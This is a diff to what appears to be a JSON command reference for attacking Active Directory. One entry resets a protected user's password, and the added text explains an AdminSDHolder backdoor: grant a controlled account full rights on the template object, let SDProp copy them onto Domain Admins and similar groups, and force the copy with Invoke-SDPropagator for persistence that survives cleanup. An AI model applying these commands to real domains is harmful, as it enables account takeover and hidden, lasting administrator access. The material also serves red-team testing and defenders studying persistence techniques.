@@ -122,5 +122,6 @@
       "label": "Abuse - reset a protected user's password",
       "command": "Set-DomainUserPassword -Identity <target_account> -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) -Verbose"
     }
-  ]
+  ],
+  "explain": "Backdoors AdminSDHolder so its ACL propagates to every protected group via SDProp:\n  Add-DomainObjectAcl       write an ACE\n  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=local'   the template object whose DACL SDProp copies out\n  -PrincipalIdentity '<user>'   the account you control\n  -Rights All              GenericAll (or WriteMembers/ResetPassword)\nEvery ~60 min SDProp stamps this ACL onto Domain Admins/Enterprise Admins/Administrators, so <user> can re-grant itself DA - persistent even after cleanup of the groups themselves. Invoke-SDPropagator forces it immediately."
 }
